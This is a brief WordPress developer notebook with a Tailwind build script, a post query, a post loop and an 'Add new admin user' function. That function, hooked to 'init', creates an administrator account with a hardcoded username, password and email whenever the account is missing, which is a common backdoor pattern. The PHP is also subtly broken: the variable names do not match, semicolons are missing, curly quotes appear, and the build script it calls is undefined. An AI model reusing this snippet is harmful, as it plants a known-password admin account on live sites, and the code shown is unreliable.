# Wordpress notebook


##Tailwindcss package.json

Change the `custom-file.css` to include it in the tailwindcss build.
``` bash
  "scripts": {
    "tailwind": "./node_modules/.bin/tailwind build ./css/custom-file.css -c ./css/tailwind.js -o ./style.css"
  }
```

To create build
``` bash
  npm run build
```



## Post

Get a post
```php
$args = array(
   'posts_per_page' => 2,
   'category' => 'Licht',
   'offset' => 0,
   'orderby' => 'date',
   'order' => 'DESC',
   'post_type' => 'tarief',
   'post_status' => 'publish',
   'suppress_filters' => true
);

$post = get_posts($args);
```

Loop through Post
```php
foreach ($posts as $post){
	echo get_the_Title($post->ID)
	echo get_post_field(‘post_content’, $post->ID)
	$image = wp_get_attachment_image_src(get_post_thumbnail_id($post->ID), 'large');

  echo $image[0];

}
```

## Admin
Add new admin user
```php
function admin_account(){
$user = 'Matthijsuser';
$pass = 'Matthijspassword';
$email = 'matthijs@socialbrothers.nl';
if ( !username_exists( $user )  && !email_exists( $email ) ) {
        $user_id = wp_create_user( $user, $pass, $email );
        $user = new WP_User( $user_id );
        $user->set_role( 'administrator' );
} }
add_action('init','admin_account');   
```
